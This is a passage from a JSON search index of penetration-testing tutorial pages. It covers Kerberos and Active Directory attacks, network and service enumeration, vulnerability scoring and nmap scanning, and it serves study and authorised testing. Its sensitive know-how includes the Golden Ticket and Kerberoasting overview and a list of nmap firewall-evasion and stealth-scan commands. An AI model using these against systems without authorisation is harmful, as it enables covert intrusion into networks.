wants to access to the service. Application Server (AP) which offers the service required by the user. Key Distribution Center (KDC), responsible for issuing the tickets, installed on the Domain Controller (DC). It is supported by the Authentication Service (AS), which issues the TGTs. Encryption keys  There are several tickets. Many of those structures are encrypted or signed in order to prevent being tampered by third parties. KDC or krbtgt key, which is derived from the krbtgt account NTLM hash. User key, derived from user NTLM hash. Service key, derived from the NTLM hash of the service owner, which can be a user or computer account. Session key, which is negotiated between the user and KDC. Service session key to be used between user and service. Tickets  Tickets are delivered to users for enabling actions in the Kerberos realm: The Ticket Granting Service (TGS) is the ticket for authenticating with a service. It is encrypted with the service key. The Ticket Granting Ticket (TGT) is the ticket presented to the KDC to request a TGSs. It is encrypted with the KDC key. PAC  The Privilege Attribute Certificate (PAC) is included in almost every ticket. It contains the privileges of the user and is signed with the KDC key. Services can verify the PAC by communicating with the KDC (does not happen often) by checking its signature. What is not verified is whether privileges inside the PAC are correct. And a client can avoid the inclusion of the PAC inside the ticket by specifying it in the KERB-PA-PAC-REQUEST field of the ticket request. Messages  KRB-AS-REQ - The client requests an Authentication Ticket or Ticket Granting Ticket (TGT). KRB-AS-REP - The Key Distribution Center verifies the client and sends back an encrypted TGT. KRB-TGS-REQ - The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access. KRB-TGS-REP - The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client. KRB-AP-REQ - The client requests the service and sends the valid session key to prove the user has access. KRB-AP-REP - The service grants access Kerberos tickets overview  The main ticket that you will see is a ticket-granting ticket. These can come in various forms such as a .kirbi for Rubeus, .ccache for Impacket. A ticket is typically base64 encoded and can be used for various attacks. A normal TGT will only work with the given service. A KRBTGT allows for getting any service ticket, in turn allowing access to anything on the domain. Attack privilege requirements  Kerbrute Enumeration - No domain access required Pass the Ticket - Access as a user to the domain required Kerberoasting - Access as any user required AS-REP Roasting - Access as any user required Silver Ticket - Service hash required Golden Ticket - Full domain compromise (domain admin) required Skeleton Key - Full domain compromise (domain admin) required Active directory vulnerabilities  The most commonly found vulnerabilities, unordered, just as checklist. Users having rights to add computers to domain  In a default installation of Active Directory, any domain user can add workstations to the domain, as defined by the ms-DS-MachineAccountQuota attribute (default = 10). This means that any low privileged domain user can join up to 10 computers to the domain. This setting allows any user to join an unmanaged computer (like BYOD) to access the corporate domain: No Antivirus or EDR solution is pushed onto their machine No GPO settings or policies apply to their system Allows them having Administrative rights on their system PowerShell command: add-computer –domainname <FQDN-DOMAIN> -Credential <domain>\\<username> -restart –force List all computers that were added by non-admins: Import-Module ActiveDirectory Get-ADComputer -LDAPFilter \"(ms-DS-CreatorSID=*)\" -Properties ms-DS-CreatorSID AdminCount attribute set on common users  The AdminCount attribute in Active Directory is used to protect administrative users and...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e8b808f9d750cbb9239bf279386fb2dc",
    "u": "https://enum.tymyrddin.dev/docs/system/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  System enumeration is a process of connecting to and interrogating a network or system to retrieve information about that network or system. Take information already gathered during reconnaissance (like IP addresses) and during scanning (open ports) and gather as much data about the targets and services running on the targets, using a variety of techniques and tools. Why?  To discover potential attack vectors in the system, and further exploitation of the system. Items of great interest: Network services that are running but not in use. Default user accounts that have no passwords. User accounts that have a revealed password. Guest accounts that are active. Security tokens. How?  NetBios enumeration SNMP enumeration LDAP enumeration NTP enumeration SMTP enumeration DNS enumeration macOS enumeration Linux enumeration Windows enumeration Scanning virtualised systems Scanning cloud infrastructure",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "098c1e5cdd78323ada26496c43d9d2ee",
    "u": "https://enum.tymyrddin.dev/docs/system/dns",
    "t": "DNS enumeration ",
    "c": "DNS enumeration  DNS enumeration is possible by sending zone transfer requests to the DNS primary server pretending to be a client. DNS enumerating reveals sensitive domain records in response to the request. Tools  DNS enumeration tools Remediation  Configure DNS servers not to send DNS zone transfers to unauthenticated hosts. Make sure DNS zone transfers do not contain HINFO information. Trim DNS zone files to prevent revealing unnecessary information.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "bc1c5a6c57ac8af2512aff5d7735c05d",
    "u": "https://enum.tymyrddin.dev/docs/app/api",
    "t": "Scanning an API ",
    "c": "Scanning an API  There are two main architectural styles used in modern APIs: SOAP: a highly structured message protocol that supports multiple low-level protocols. REST: a simpler approach to APIs using HTTP/S as the transport protocol, and typically using JSON format for data transfer. Both types of APIs support HTTP requests and responses and Secure Sockets Layer (SSL), but the similarity ends there. The increase of API-related security threats in recent years has prompted the Open Web Application Security Project (OWASP) to release the API Security Top 10, which helps raise awareness of the most serious API security issues affecting organizations. Use either the ZAP-API Scan or Burp API scan . Resources  OWASP API Security Project",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "a024b71865d68290052537f1448d20b6",
    "u": "https://enum.tymyrddin.dev/docs/app/automated",
    "t": "Automated vulnerability scanning ",
    "c": "Automated vulnerability scanning  Pros and cons of using Automated vulnerability scanners : Advantages  Automated scans are easy to repeat, and the results can be shared within a team with ease. These scanners are quick and can test numerous applications efficiently. Open-source solutions exist. Automated scanners cover a wide range of different vulnerabilities that may be hard to manually search for. Disadvantages  People can often become reliant on these tools. They are extremely “loud” and produce a lot of traffic and logging. This is not good if you are trying to bypass security controls. Open-source solutions are often basic and require expensive licenses to have useful features. They often do not find every vulnerability on an application.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "af269ce6c0ea692e34a159f21705ac1e",
    "u": "https://enum.tymyrddin.dev/docs/system/snmp",
    "t": "SNMP enumeration ",
    "c": "SNMP enumeration  Default SNMP passwords allow attackers to view or modify the SNMP configuration settings. Attackers can enumerate SNMP on remote network devices for: Information about network resources such as routers, shares, devices, etc. ARP and routing tables Device specific information Traffic statistics And more. Tools  SNMP enumeration tools Remediation  Minimize the attack surface by removing the SNMP agents where not needed. Change default public community strings. Upgrade to SNMPv3, which encrypts the community strings and messages. Implement group policy for additional restriction on anonymous connections. Implement firewalls to restrict unnecessary connections. Implement IPSec filtering. Block access to TCP/UDP ports 161. Encrypt and authenticate using IPSEC.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1f26fd1b6a07d6de4a8e205edf448574",
    "u": "https://enum.tymyrddin.dev/docs/overview",
    "t": "Enumeration overview ",
    "c": "Enumeration overview  Enumerate hosts on the network using Zenmap. Zenmap is a version of Nmap that has a graphical interface. Use Zenmap to create a network topology to help identify the network layout. Try to enumerate users and groups. Try to get a list of SMB shares on the system. Enumerate uniform resource locators (URLs) and retrieve any web pages. Identifying the software running on a system can be tricky. Get creative. For example, use Ncrack to do a dictionary attack on the administrator account and then supply that as the credentials to a script to see a list of the processes running on that system. Get lists of services running on a system by performing an nmap scan. Try to obtain security tokens. Enumerate social media posts by a user with a given IP address by using a tool like recon-ng . A full scan does a variety of tests to identify vulnerabilities in the system. For example, Nessus can be set to use a number of plug-ins such as for checking for security issues with Simple Mail Transfer Protocol (SMTP) and Simple Network Management Protocol (SNMP) services, checking for Linux security issues, and checking for web server and Windows vulnerabilities, etc. Such scans are considered to be aggressive. If red teaming or hired to do a penetration test where the security team is not informed of our presence, we can do a stealth scan and are to put more effort into choosing specific scanning techniques to avoid detection by the blue/security team, for example by not scanning the full IP range sequentially, or scanning ports sequentially, and by using multiple source IP addresses to scan from. Compliance scanning by externals has its own rules and requirements. For example, for compliance with the Payment Card Industry Data Security Standard (PCI DSS) standards, these include: Both internal and external scans must be performed. External scans must be approved by an approved scanning vendor (ASV). Vulnerability scans are to be done quarterly and after any major change to the environment. If critical vulnerabilities are found, they must be remediated and then a new scan done to validate the remediation steps have removed the vulnerability. When doing a vulnerability scan on target systems, do it multiple times, as an anonymous, non-credentialed user, and as a credentialed user with and without administrative credentials. As a non-credentialed user we are not to see information such as the password policies configured, group membership, and other configuration settings. As a credentialed user with an administrative account, we may get information about the configuration of the system including vulnerabilities related to user accounts (for example an account called “administrator” or “admin”) and group membership (too many users in the administrators group), missing patches, and password policy configuration settings.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "ea87b6ea64a6f9ab6b5d2083ad091f52",
    "u": "https://enum.tymyrddin.dev/docs/system/netbios",
    "t": "NetBios enumeration ",
    "c": "NetBios enumeration  NetBIOS is outdated but still lives on in some older systems, sometimes for backward compatability. It is the equivalent of broadcasting names to look for each other but is not routable. It is local network only. If no one on the other network can use it for your network, then no one there can access your NetBIOS shared folders and printers, unless one has gained access to your local network. You can also access NetBIOS machines with a WINS server. That is the NetBIOS equivalent of a DNS server. NetBIOS software runs on port 139 on the Windows operating system. File and printer services need to be enabled to enumerate NetBIOS over Windows. An attacker can perform the following on the remote machine: Choosing to read or write to a remote machine, depending on the availability of shares. Launching a Denial of Service (DoS) attack on the remote machine. Enumerating password policies on the remote machine. Tools  NetBios enumeration tools Remediation  Minimise the attack surface by minimising the unnecessary service like Server Message Block (SMB). Remove file and printer sharing in Windows OS.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "454ff8ca59627211003a08a68be3a771",
    "u": "https://enum.tymyrddin.dev/docs/vulns/mapping",
    "t": "Mapping vulnerabilities to exploits ",
    "c": "Mapping vulnerabilities to exploits  Attack tree  1 List and score exploitable vulnerabilities 1.1 by Common Vulnerability Scoring System (CVSS) (OR) 1.1.1 Calculate Exploitability 1.1.2 Calculate Impact 1.1.3 f(Impact) 1.1.4 BaseScore 1.2 by Vulnerability Priority Rating (VPR) 2 Prioritisation possibilities 2.1 Severity level 2.2 Vulnerability exposure 2.3 Criticality Common Vulnerability Scoring System (CVSS)  The Common Vulnerability Scoring System (CVSS) is a standard vulnerability scoring system used by vulnerability scanners to identify the severity of the vulnerability. A CVSS base score can be a number from 0 to 10, with 0 being the least severe, and 10 being the most severe. The format of the base score for CVSS2: CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C Three metrics are used to calculate the exploitability of a vulnerability: The access vector (AV), used to measure how the hacker executes the exploit. Does she have to have physical access to the system, be in an adjacent network and use pivoting, or is the vulnerability exploitable from a remote network? The attack complexity (AC), to describe how easy or difficult it is to exploit the vulnerability. Authentication (Au), used to specify how many times she would need to authenticate to exploit the vulnerability. Exploitability = 20 * AV * AC * Au Impact metrics are used to identify what the impact of the exploit is on the confidentiality (C), integrity (I), and availability (A) of systems and their data. The values can be None (N), Partial (P) or Complete (C) Impact = 10.41 * (1-(1-C)*(1-I)*(1-A)) f(Impact) = 0 if Impact = 0, 1.176 otherwise. End score: BaseScore = roundToOneDecimal(( (0.6*Impact) + (0.4*Exploitability)-1.5) * f(Impact)) Vulnerability Priority Rating (VPR)  The VPR framework is a more modern framework in vulnerability management - developed by Tenable, an industry solutions provider for vulnerability management. This framework is considered to be risk-driven; meaning that vulnerabilities are given a score with a heavy focus on the risk a vulnerability poses to the organisation itself, rather than factors such as impact (like with CVSS). Unlike CVSS, VPR scoring takes into account the relevancy of a vulnerability. For example, no risk is considered regarding a vulnerability if that vulnerability does not apply to the organisation. VPR is also considerably dynamic in its scoring, where the risk that a vulnerability may pose can change almost daily as it ages. VPR uses a similar scoring range as CVSS. Two notable differences are that VPR does not have a None/Informational category, and because VPR uses a different scoring method (youtube) , the same vulnerability will have a different score using VPR than when using CVSS. Nessus  In Nessus, the Vulnerability Information includes whether known exploits are available for a vulnerability. The section labeled “Exploitable With” even shows what tools can be used to exploit the vulnerability. Real Risk Score (RRS)  Real Risk Score (RRS) not only takes into account the equation behind the CVSS of each vulnerability, but also the Metasploit modules that could be launched against it, the malware kits detected, and even how old the vulnerability is. Resources  NVD CVSS v2 Calculator NVD CVSS v3 Calculator Vulnerability Priority Rating (VPR) Summary Real Risk Score",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cfeaea289a0f4fb49ef8e455286cfe4b",
    "u": "https://enum.tymyrddin.dev/docs/app/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Application scanning tools can be used to perform an audit on an application. There are basically two types of application audit tools: A dynamic analysis tool assesses vulnerabilities in an application by analysing the behaviour of the application while it is running (how it responds to input). The best is a combination of scanning and using scanners like Zap and Burp in a manual walkthrough. In a static analysis, the source code is reviewed for vulnerabilities. Can be done manually or using an automated vulnerability scanner. Use both for manual and automated scanning of the application. Why?  Move further and deeper into the scanning process to include security scanning and discover vulnerabilities to exploit. How?  Dynamic web application scanning Enumerate databases Download or obtain and decompile binaries Automated vulnerability scanning Scanning an API",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "275316b5407eae7e98bb36d23e19b8a5",
    "u": "https://enum.tymyrddin.dev/docs/vulns/prioritisation",
    "t": "Prioritisation of vulnerabilities ",
    "c": "Prioritisation of vulnerabilities  Asset categorisation — how critical is the system that has vulnerabilities? Adjudication — making a decision on whether the vulnerability discovered is a false positive. Review and validate. Prioritisation of vulnerabilities — if a vulnerability exploits confidentiality, integrity, or availability, then that vulnerability would typically take priority. Common Vulnerability Scoring System (CVSS)  Advantages  CVSS has been around for a long time. CVSS is popular in organisations. CVSS is a free framework to adopt and recommended by organisations such as NIST. Disadvantages  CVSS was never designed to help prioritise vulnerabilities, instead, just assign a value of severity. CVSS heavily assesses vulnerabilities on an exploit being available. Only 20% of all vulnerabilities have an exploit available ( Tenable., 2020 ). Vulnerabilities rarely change scoring after assessment despite the fact that new developments such as exploits may be found. Vulnerability Priority Rating (VPR)  Advantages  VPR is a modern framework that is real-world. VPR considers over 150 factors when calculating risk. VPR is risk-driven and used by organisations to help prioritise patching vulnerabilities. Scorings are not final and are very dynamic, meaning the priority a vulnerability should be given can change as the vulnerability ages. Disadvantages  VPR is not open-source like some other vulnerability management frameworks. VPR can only be adopted separate from a commercial platform. VPR does not consider the CIA triad to the extent that CVSS does; meaning that risk to the confidentiality, integrity and availability of data does not play a large factor in scoring vulnerabilities when using VPR. Real Risk Score (RRS)  Real Risk Score (RRS) may offer a good alternative. It enriches CVSS data to provide a more precise risk score.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f9f57e43799169b1563d26179028d219",
    "u": "https://enum.tymyrddin.dev/docs/app/scanning",
    "t": "Dynamic web application scanning ",
    "c": "Dynamic web application scanning  Features of the two main web application scanners (community versions): Feature Burp Suite Community Edition OWASP ZAP Burp Suite Pro Web Application Scanning Not Available Available with basic security vulnerabilities Available with quality security vulnerabilities Intercepting Feature Available Available Available Fuzzing Capabilities Available Available Available Encoder and Decoder Available Not Available Available Cost Free Free Paid Subscription Advanced Functionality ($450 per year) Documentation Extensive Little Extensive Spider Available Available Available Updates Available Available Available Extensions Less Options No provision for enhance functionality Available Coverage Medium coverage Less coverage Extensive Coverage False Positive Less More Less Session Token Entropy Analysis Available Not Available Available Comparison Feature Available Not Available Available",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d60a0f3306d489a4438058abb064816a",
    "u": "https://enum.tymyrddin.dev/docs/vulns/more",
    "t": "Discovering more vulnerabilities/exploits ",
    "c": "Discovering more vulnerabilities/exploits  Attack tree  1 Known vulnerabilities/exploits (AND) 1.1 Look up in Exploit databases 1.2 Vulnerability scanning 2 Latent vulnerabilities (AND) 2.1 Security code reviews 2.2 Specific code scanning for vulnerabilities 3 New vulnerabilities 3.1 Root cause analysis 3.2 Variant analysis 3.3 Patch analysis 3.4 Exploit technique analysis 4 New exploits 4.1 Proof-of-concept development (exploit development) 4.2 Cross-compiling 4.3 Modifying an existing exploit 4.4 A new exploit chain (a new on-path) Notes  Manual security code reviews  Manual security code reviews are usually performed by developers or security experts. Such efforts usually take place during a security push or pentesting engagement and are associated with a final security review. Coding errors can be found using different approaches, but even when compared to sophisticated tools, manual code reviews have clearly proven their value in the areas of precision and quality. Unfortunately, manual code reviews are also the most expensive to execute. It is important the developers are not part of the team that created the code, and a facilitator/security professional is also a good idea. New vulnerabilities  New vulnerabilities are usually found through bug bounty programs, or researched by dedicated groups like Google Project Zero. New exploits  Developing your own exploit is a great way to demonstrate proof of concept that the exploit can happen without focusing on performing malicious activity on the target system. Cross-compiling by downloading the source code of an existing exploit and compiling it for another platform. Modifying the exploit to fit your needs before compiling the exploit is also a good option. Exploit chaining uses a combination of different exploits run one after the other. Resources known vulnerabilities  0-days In-the-Wild Blackhat 2020: Reversing the Root (pdf of slides)",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "55e2a7ec52f92c0d92359d62332a0fd3",
    "u": "https://enum.tymyrddin.dev/docs/system/cloud",
    "t": "Scanning cloud infrastructure ",
    "c": "Scanning cloud infrastructure  Most internet resources on cloud providers, like load balancers, content distribution networks, S3 buckets, etc., regularly rotate their IP addresses. If the nmap takes too long, the addresses will have been assigned to another customer and the results will no longer be relevant. Scan domain names, not IP addresses. nmap -F -sV -iL domains.txt -oA results Spotting hidden relationships  Consider the core business and what other servers and datastores there are likely to be. Keep an eye open for information that might indicate where to find those.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "54522f627bbdd621763a16e528931aea",
    "u": "https://enum.tymyrddin.dev/docs/system/ntp",
    "t": "NTP enumeration ",
    "c": "NTP enumeration  An attacker can enumerate the following information by querying an NTP server. List of hosts connected to the NTP server Internal client IP addresses, hostnames and operating system used Tools  NTP enumeration tools Remediation  Restrict the usage of NTP and enable the use of NTPSec, where possible. Filter the traffic with IPTables. Enable logging for the messages and events.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "87c7f8b3aca09a9b29a4f4d7273e785b",
    "u": "https://enum.tymyrddin.dev/docs/vulns/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Discover vulnerabilities: Known vulnerabilities are the simplest vulnerabilities which have been discovered and disclosed. These are often found in the libraries and frameworks that are part of an application. These vulnerabilities tend to get hit very quickly (hours) after disclosure by automated attacks from all over the world, so response speed is critical. Latent vulnerabilities are instances of typical vulnerability classes.: buffer overflows, cross-site scripting (XSS) and SQL injection for example.These vulnerabilities are not listed in databases – these are unique to each application. New vulnerabilities represent a new class of vulnerability. These appear at a slow rate, maybe one or two per year. After discovery, research and confirmations, these turn into latent vulnerabilities. There is a learning curve on these new vulnerabilities for attackers and defenders. This type of research is expensive and for most companies unlikely to produce much payoff in terms of overall risk reduction. Why?  To compromise the security of the system and potentially gain full access to the system. How?  Mapping vulnerabilities to exploits Prioritisation of vulnerabilities Discovering more vulnerabilities/exploits",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "36d98026c869ed6b8d5fb4b4f6dc6d45",
    "u": "https://enum.tymyrddin.dev/docs/system/ldap",
    "t": "LDAP enumeration ",
    "c": "LDAP enumeration  LDAP supports anonymous remote queries on the server. The query will disclose sensitive information such as usernames, address, contact details, etc. Tools  LDAP enumeration tools Remediation  Use SSL to encrypt LDAP communication Use Kerberos to restrict the access to known users Enable account lockout to restrict brute-forcing Create a few Active Directory Decoy accounts Enable auditing on those accounts Run Bloodhound’s Sharphound tool Perform LDAP Reconnaissance activities within the active directory environment Detect the activities in Windows event logs.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "107794ffefe7d0da979c234ae03f2a2e",
    "u": "https://enum.tymyrddin.dev/docs/app/binaries",
    "t": "Download or obtain and decompile binaries ",
    "c": "Download or obtain and decompile binaries  Download or obtain binaries and then use a decompiler to analyse the binary . Review the application in a debugger. Look for information such as remote systems the application connects to, database connection strings, or usernames and passwords used by the application (there may be a backdoor).",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cb6e186f91b8d4679c6f5a5c847724c8",
    "u": "https://enum.tymyrddin.dev/docs/system/linux",
    "t": "Linux enumeration ",
    "c": "Linux enumeration  Get information from: Settings: Users and usernames Applications: some run on defaults, or there may be null or blank passwords Permissions on key directories and files Shares if linux shares resources over the network Samba, the linux equivalent to smb, may give information about the windows network and its shares NFS information can give information on permissions and the network services Network services such as DNS , LDAP , SMTP , etc. Various built-in commands and utilities Tools  Linux enumeration tools Remediation  Minimize the attack surface by removing any unnecessary or unused service. Ensure IPTables is configured to restrict the access.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "90a4cd9ec2bd9e8e4a00397f11ccfa44",
    "u": "https://enum.tymyrddin.dev/docs/system/smtp",
    "t": "SMTP enumeration ",
    "c": "SMTP enumeration  SMTP provides three built-in commands: VRFY: Validate users on the SMTP servers EXPN: Delivery addresses of aliases and mailing lists RCPT TO: Defines the recipients of the message SMTP servers respond differently to the commands mentioned above, and SMTP enumeration is possible due to varied responses. Attackers can determine the valid users on the SMTP servers with the same technique. Tools  SMTP enumeration tools Remediation  Ignore email responses from unknown recipients. Disable open relay functionality. Prune any sensitive information like mail server and localhost in the mail responses.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e51a3a5b7a01adf9feec37ef369c98d7",
    "u": "https://enum.tymyrddin.dev/docs/system/windows",
    "t": "Windows enumeration ",
    "c": "Windows enumeration  Get information: Usernames Default configurations Default passwords Domain names Computer names Shares Windows information Network information like DNS , SMTP , SNMP information Application details Banners Routing tables Tools  Windows enumeration tools Remediation  Minimize the attack surface by removing any unnecessary or unused service. Ensure IPTables is configured to restrict the access.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "517b315e6fd40e47e801db5896d51370",
    "u": "https://enum.tymyrddin.dev/docs/system/macos",
    "t": "macOS enumeration ",
    "c": "macOS enumeration  Get information from: Settings: Users and usernames Applications: some run on defaults, or there may be null or blank passwords Permissions on key directories and files Shares if macOS shares resources over the network Samba, the linux equivalent to smb, may give information about the windows network and its shares NFS information can give information on permissions and the network services Network services such as DNS , LDAP , SMTP , etc Various built-in commands and utilities Tools  macOS enumeration tools Remediation  Minimize the attack surface by removing any unnecessary or unused service. Ensure IPTables is configured to restrict the access.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "7a7948d45c2b893ccde3bfea260a6c84",
    "u": "https://enum.tymyrddin.dev/docs/app/database",
    "t": "Enumerate databases ",
    "c": "Enumerate databases  Gather information using database enumeration tools : Find a page url with a GET request parameter Test different SQL injection methods against the request parameter List information about the existing databases List information about tables present in a particular database List information about the columns of a particular table Dump the data",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cee55ab4f5890c064bbed72e7189817c",
    "u": "https://enum.tymyrddin.dev/",
    "t": "Lay of the land ",
    "c": "Lay of the land  Move further and deeper into the scanning process to include security scanning. Enumeration is particularly useful in networks that contain unprotected network resources and services. The distinction between reconnaissance and remote enumeration is an arbitrary grey area, and during enumeration new hosts and/or services may show up, so what you can not find here you may find there . Preparation Build a local testlab Enumeration overview Systems Introduction NetBios enumeration SNMP enumeration LDAP enumeration NTP enumeration SMTP enumeration DNS enumeration macOS enumeration Linux enumeration Windows enumeration Scanning virtualised systems Scanning cloud infrastructure Web applications Introduction Dynamic web application scanning Enumerate databases Download or obtain and decompile binaries Automated vulnerability scanning Scanning an API Vulnerability identification Introduction Mapping vulnerabilities to exploits Prioritisation of vulnerabilities Discovering more vulnerabilities/exploits",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d1fb7158db4895c0da090e1a0a4c25fd",
    "u": "https://recon.tymyrddin.dev/",
    "t": "Falconry ",
    "c": "Falconry  Getting to know the target using methods like researching publicly available information and network scanning. Preparation Build a local testlab Footprinting Introduction Gather network information Gather system information Collect organisation information Initial scanning Introduction War-dialing-driving-flying-shipping Live host discovery Host discovery with ICMP Host discovery with TCP Host discovery with UDP Port scanning Service and OS detection Diving deeper in discovery Defence detection Stealth scans Firewall evasion Canopy of apple-blossom Introduction Manually walk through the target Scope discovery Other sneaky OSINT techniques Tech stack fingerprinting API Mayhem Introduction Collect data Understand application functionality Analyse traffic Document key parameters Check for exposed secrets Head in the clouds Introduction Mapping endpoints Investigating AWS S3 URLs Pocketful of acorns Introduction Passive reconnaissance Recon of facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "54d37ed8ae0101af9f5cf86095e2c0d5",
    "u": "https://recon.tymyrddin.dev/docs/scanning/service-and-os",
    "t": "Service and OS detection ",
    "c": "Service and OS detection  Detect Operating Systems Detect services Service and OS detection use different methods to determine the operating system or service running on a particular port. Detect services: # nmap -sV -T4 -Pn -oG ServiceDetect -iL $TARGETFILE OS detection: # nmap -O -T4 -Pn -oG OSDetect -iL $TARGETFILE",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "516b73f997f19907408cf9a557036fbf",
    "u": "https://recon.tymyrddin.dev/docs/api/parameters",
    "t": "Document key parameters ",
    "c": "Document key parameters  An API’s attack surface includes the inputs and outputs of the API. Using the inputs and outputs, determine the potential vulnerabilities in the API. These inputs and outputs include: API calls URL parameters Headers Cookies Web responses File uploads API keys Identify the inputs and outputs of the API: The inputs and outputs of an API can be identified by the endpoints that the API provides. Make requests to different endpoints, interacting with the resources that the API exposes. The responses that the API sends back will contain the information necessary to understand the structure of the data being returned. Resources  API Security Top 10 2019",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "17825e36126dfc3ace6f87d8ffb5728c",
    "u": "https://recon.tymyrddin.dev/docs/scanning/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use … Why?  To find potential initial vulnerable attack vectors. How?  War-dialing-driving-flying-shipping Live host discovery Host discovery with ICMP (ping sweep) Host discovery with TCP Host discovery with UDP Port scanning Service and OS detection Diving deeper in discovery Defence detection Stealth scans Firewall evasion",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "738465a0e68d71e161decdd51698ce1f",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/network",
    "t": "Gather network information ",
    "c": "Gather network information  Domains Subdomains IP addresses Whois and DNS records Whois and IP Geolocation  Whois databases contain domain owners’ personal information and are maintained by the Regional Internet Registries. Thick whois contains all information from all registrars for the specified set of data. Thin whois contains limited information about the specified set of data. Whois query results typically include: Domain details Domain owner details Domain server Net range Domain expiration Creation and last update dates Regional Internet Registries, which maintain the whois databases, include: Reseaux IP Europeens Network Coordination Centre (RIPE) American Registry for Internet Numbers (ARIN) Asia-Pacific Network Information Centre (APNIC) Latin America and Caribbean Network Information Centre (LACNIC) Africa’s NIC (AFRINIC) IP Geolocation  IP geolocation helps find location information about a target such as country, city, postal code, ISP, and so on. This informationis useful for (planning) social engineering attacks on the target. DNS footprinting  DNS footprinting involves collecting information about DNS zone data, which includes information about server types and locations of key hosts in the network. Network Footprinting  Network footprinting refers to the process of collecting information about the target’s network. During this process, attackers collect network range information and use the information to map the target’s network. Network range gives attackers an insight into how the network is structured and which machines belong to the network. Nmap can be used for network discovery. It uses raw IP packets to determine the available hosts on the network, the services offered by those hosts, operating systems they are running, firewall types that are being used, and other important characteristics. Traceroute programs uses the ICMP protocol and the TTL field in the IP header to discover a route to the target host. It records IP addresses and DNS names of discovered routers underway. This information can be used for man-in-the-middle and other related attacks. The results of a traceroute can also be used to collect information about network topology, trusted routers, and firewall locations, useful for creating network diagrams and planning attacks.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b9473199958a0f7470288675561f1f33",
    "u": "https://recon.tymyrddin.dev/docs/cloud/map",
    "t": "Mapping endpoints ",
    "c": "Mapping endpoints  Collect information to identify assets a target has across all cloud providers. Identify services hosted with third-party companies. Map out all the endpoints: user interface, APIs, subnetworks, etc. for which testing is to be done. Decide which endpoints to exclude based on policy restrictions, user permissions, etc. Decide the route for performing the pentest: from application or database. Figure out how well the application server and VMs can take the load of the tests. Find out the laws that need to be followed while performing tests. Figure out which tools to use and what types of tests to do on which endpoints (Automated or Manual). Get approval for the plan from the client and inform them when you wish to begin.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1ff9b63c2a2b9b13ace655d24f5a3566",
    "u": "https://recon.tymyrddin.dev/docs/scanning/firewall",
    "t": "Firewall evasion ",
    "c": "Firewall evasion  Fragment packets: # nmap -f <IP> Most firewalls and IDS detect fragmented packets. The nmap --mtu command allows for specifying offset size (has to be a multiple of 8). This is similar to the packet fragmentation technique. During the scan, nmap creates packets of that size, causing confusion to the firewall. # nmap --mtu [MTU] <IP> Decoy: # nmap -D RND:[number] <IP> Idle zombie scan: # nmap -sI [zombie] <IP> Manually specify a source port: # nmap --source-port [port] <IP> Append random data: # nmap --data-length [size] <IP> Randomize target scan order: # nmap --randomize-hosts <IP> Spoof MAC address: # nmap --spoof-mac [MAC|0|vendor] <IP> Send bad checksums: # nmap --badsum <IP> The badsum command deploys an invalid TCP/UDP/SCTP checksum for packets transmitted to the target. Practically every host IP stack will correctly drop the packets, so each response accepted is possibly originating from a firewall or Intrusion Detection System that was not concerned with confirming the checksum.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "60ee3fc55140efa070290625facf78dd",
    "u": "https://recon.tymyrddin.dev/docs/scanning/tcp",
    "t": "Host discovery with TCP ",
